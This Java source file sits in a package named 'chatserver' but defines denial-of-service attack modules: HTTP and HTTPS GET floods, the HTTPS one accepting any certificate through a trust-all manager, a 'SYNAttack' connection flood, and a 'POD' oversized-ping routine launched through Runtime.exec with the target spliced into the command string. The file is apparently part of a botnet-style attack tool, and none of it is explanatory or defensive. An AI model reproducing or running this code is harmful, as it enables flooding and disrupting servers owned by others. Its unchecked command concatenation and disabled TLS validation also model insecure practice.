package me.pk2.chatserver.container;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.net.*;
import java.util.HashMap;

public class ContainerManager {
    public final HashMap<String, Container> containers;

    public ContainerManager() {
        this.containers = new HashMap<>();

        this.containers.put("HTTPAttack", new Container("HTTPGet") {
            @Override
            public void sendTick(String x0, int x1, String x2, int x3, int x4) {
                try {
                    HttpURLConnection connection = (HttpURLConnection)new URL(x0).openConnection();
                    connection.setDoOutput(true);
                    connection.setDoInput(true);
                    connection.setRequestMethod("GET");
                    connection.setRequestProperty("charset", "utf-8");
                    connection.setRequestProperty("Host", x0);
                    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
                    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    connection.setRequestProperty("Content-Length", "param1=" + URLEncoder.encode(x2, "UTF-8"));
                    connection.getResponseCode();
                    connection.getInputStream();
                } catch (Exception exception) {  }
            }
        });

        TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
                }
        };

        this.containers.put("HTTPSAttack", new Container("HTTPSGet") {
            @Override
            public void sendTick(String x0, int x1, String x2, int x3, int x4) {
                try {
                    SSLContext sc = SSLContext.getInstance("SSL");
                    sc.init(null, trustAllCerts, new java.security.SecureRandom());

                    HttpsURLConnection connection = (HttpsURLConnection)new URL(x0).openConnection();
                    connection.setSSLSocketFactory(sc.getSocketFactory());
                    connection.setDoOutput(true);
                    connection.setDoInput(true);
                    connection.setRequestMethod("GET");
                    connection.setRequestProperty("charset", "utf-8");
                    connection.setRequestProperty("Host", x0);
                    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
                    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    connection.setRequestProperty("Content-Length", "param1=" + URLEncoder.encode(x2, "UTF-8"));
                    connection.getResponseCode();
                    connection.getInputStream();
                } catch (Exception exception) { exception.printStackTrace(); }
            }
        });

        this.containers.put("SYNAttack", new Container("SYN") {
            @Override
            public void sendTick(String x0, int x1, String x2, int x3, int x4) {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(x0, x1), 2500);
                    Thread.sleep(50);
                    socket.close();
                } catch (Exception exception) {  }
            }
        });

        this.containers.put("POD", new Container("POD") {
            @Override
            public void sendTick(String x0, int x1, String x2, int x3, int x4) {
                try {
                    Runtime.getRuntime().exec(System.getProperty("os.name").contains("Windows")?
                            "ping " + x0 + " -l 65527":
                            "ping " + x0 + " -s 65527");
                } catch (Exception exception) {  }
            }
        });
    }
}